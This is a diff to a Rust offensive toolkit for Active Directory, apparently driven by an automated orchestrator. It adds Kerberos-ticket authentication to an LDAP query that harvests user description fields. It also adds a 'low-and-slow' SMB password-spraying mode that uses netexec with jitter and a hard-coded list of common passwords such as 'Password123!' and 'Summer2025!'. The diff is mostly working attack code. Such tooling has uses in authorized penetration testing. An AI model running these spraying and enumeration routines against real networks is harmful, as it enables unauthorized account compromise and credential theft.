@@ -170,13 +170,13 @@ pub async fn laps_dump(args: &Value) -> Result<ToolOutput> {
 /// domain than the one being queried. Defaults to `domain`.
 pub async fn ldap_search_descriptions(args: &Value) -> Result<ToolOutput> {
     let target = required_str(args, "target")?;
-    let username = required_str(args, "username")?;
-    let password = required_str(args, "password")?;
     let domain = required_str(args, "domain")?;
+    let username = optional_str(args, "username");
+    let password = optional_str(args, "password");
     let bind_domain = optional_str(args, "bind_domain");
     let base_dn = optional_str(args, "base_dn");
+    let ticket_path = optional_str(args, "ticket_path");
 
-    // Build base DN from domain if not explicitly provided.
     let computed_base_dn = match base_dn {
         Some(dn) => dn.to_string(),
         None => domain
@@ -186,21 +186,27 @@ pub async fn ldap_search_descriptions(args: &Value) -> Result<ToolOutput> {
             .join(","),
     };
 
-    let auth_domain = bind_domain.unwrap_or(domain);
-    let bind_dn = format!("{username}@{auth_domain}");
     let ldap_uri = format!("ldap://{target}");
 
-    CommandBuilder::new("ldapsearch")
-        .arg("-x")
+    let mut cmd = CommandBuilder::new("ldapsearch")
         .flag("-H", &ldap_uri)
-        .flag("-D", &bind_dn)
-        .flag("-w", password)
-        .flag("-b", &computed_base_dn)
+        .timeout_secs(120);
+
+    if let Some(ccache) = ticket_path {
+        cmd = cmd.env("KRB5CCNAME", ccache).arg("-Y").arg("GSSAPI");
+    } else {
+        let u = username.ok_or_else(|| anyhow::anyhow!("missing required arg: username"))?;
+        let p = password.ok_or_else(|| anyhow::anyhow!("missing required arg: password"))?;
+        let auth_domain = bind_domain.unwrap_or(domain);
+        let bind_dn = format!("{u}@{auth_domain}");
+        cmd = cmd.arg("-x").flag("-D", &bind_dn).flag("-w", p);
+    }
+
+    cmd.flag("-b", &computed_base_dn)
         .arg("(&(objectClass=user)(description=*))")
         .arg("sAMAccountName")
         .arg("description")
         .arg("userPrincipalName")
-        .timeout_secs(120)
         .execute()
         .await
 }
@@ -404,7 +410,8 @@ pub async fn password_policy(args: &Value) -> Result<ToolOutput> {
 pub async fn password_spray(args: &Value) -> Result<ToolOutput> {
     let target = required_str(args, "target")?;
     let users_file = optional_str(args, "users_file");
-    let password = required_str(args, "password")?;
+    let password = optional_str(args, "password");
+    let use_common_passwords = optional_bool(args, "use_common_passwords").unwrap_or(false);
     let domain = required_str(args, "domain")?;
     let delay_seconds = optional_i64(args, "delay_seconds");
     let lockout_threshold = optional_i64(args, "lockout_threshold");
@@ -427,7 +434,18 @@ pub async fn password_spray(args: &Value) -> Result<ToolOutput> {
         tmp_file
     };
 
-    let cred_args = credentials::netexec_creds(None, Some(password), None, Some(domain));
+    let tmp_password_file;
+    let password_arg = match (password, use_common_passwords) {
+        (Some(p), _) => p.to_string(),
+        (None, true) => {
+            tmp_password_file = format!("/tmp/spray_pwlist_{}.txt", std::process::id());
+            std::fs::write(&tmp_password_file, DEFAULT_SPRAY_PASSWORDS)?;
+            tmp_password_file
+        }
+        (None, false) => anyhow::bail!(
+            "password_spray requires either 'password' or 'use_common_passwords=true'"
+        ),
+    };
 
     let jitter = delay_seconds
         .unwrap_or(SPRAY_DEFAULT_JITTER_SECS)
@@ -437,7 +455,8 @@ pub async fn password_spray(args: &Value) -> Result<ToolOutput> {
         .arg("smb")
         .arg(target)
         .flag("-u", &wordlist_path)
-        .args(cred_args)
+        .flag("-p", &password_arg)
+        .flag("-d", domain)
         .arg("--continue-on-success")
         .flag("--jitter", &jitter)
         .timeout_secs(300)
@@ -447,6 +466,9 @@ pub async fn password_spray(args: &Value) -> Result<ToolOutput> {
     // Clean up temp file if we created one
     if users_file.is_none() {
         let _ = std::fs::remove_file(&wordlist_path);
+    }
+    if password.is_none() && use_common_passwords {
+        let _ = std::fs::remove_file(&password_arg);
     }
 
     result
@@ -520,6 +542,24 @@ paul.jackson\nlaura.chen\nmark.reed\n\
 sql_admin\ndb_admin\n\
 webadmin\nnetadmin\n\
 helpdesk\nsupport\nservice\n";
+
+/// Common AD passwords for fallback low-and-slow spraying when the orchestrator
+/// explicitly requests a common-password pass instead of a single known value.
+const DEFAULT_SPRAY_PASSWORDS: &str = "\
+Password123!\n\
+Welcome1\n\
+Welcome123\n\
+Summer2024!\n\
+Summer2025!\n\
+Winter2024!\n\
+Winter2025!\n\
+Spring2025!\n\
+Autumn2025!\n\
+Company123!\n\
+Changeme123!\n\
+P@ssw0rd\n\
+P@ssw0rd!\n\
+Password1\n";
 
 /// Test each username as its own password via `netexec smb --no-bruteforce`.
 pub async fn username_as_password(args: &Value) -> Result<ToolOutput> {
